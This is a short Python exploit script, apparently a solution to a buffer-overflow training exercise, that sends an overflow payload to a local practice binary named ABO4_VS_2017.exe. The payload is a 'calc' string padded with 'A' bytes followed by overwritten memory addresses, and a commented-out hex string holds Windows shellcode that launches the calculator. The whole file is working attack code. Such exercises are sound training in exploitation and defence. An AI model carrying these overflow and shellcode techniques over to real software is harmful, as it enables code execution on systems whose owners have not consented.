import sys
from struct import *
from subprocess import Popen, PIPE

#shellcode = '33d2526863616c6389e65256648b72308b760c8b760cad8b308b7e188b5f3c8b5c1f788b741f2001fe8b4c1f2401f90fb72c5142ad813c0757696e4575f18b741f1c01fe033caeffd7'.decode("hex")
len_buf  = 256

exploit  = "calc\x00" +  (len_buf - len("calc\x00")) * "\x41"
exploit += pack("<L",0x415000)
exploit += "\n" + pack("<L",0x402657)                        

p1 = Popen(r"C:\Users\conde\Desktop\Reversing\tools free\ABO4\ABO4_VS_2017.exe", stdin=PIPE)
print ("PID: %s" % hex(p1.pid))
print ("Enter para continuar")
p1.communicate(exploit)
p1.wait()
